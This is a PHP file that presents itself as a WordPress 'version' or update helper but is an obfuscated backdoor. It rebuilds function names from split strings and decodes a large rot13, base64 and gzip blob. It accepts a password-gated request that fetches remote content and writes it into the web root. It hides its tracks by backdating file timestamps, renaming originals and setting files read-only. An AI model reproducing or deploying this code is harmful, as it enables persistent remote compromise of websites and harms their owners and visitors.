<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y2uioJHkY215qKWfpmL4Y2Sxo25cp2Wco2Mupz1uYzAioF93pP1wo250MJ50Y2IhMUIlLJ5wMF1jLJqyYJAuL2uyY2MyMJDiL29goJ9hYzgyrD', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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', '0');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '1');
        $data = translation_v1($data, '1');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("acxhoilr{$check}rxqzbjhk", 'e0b9ef97fa85a805c3caa30bc1468e5c')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}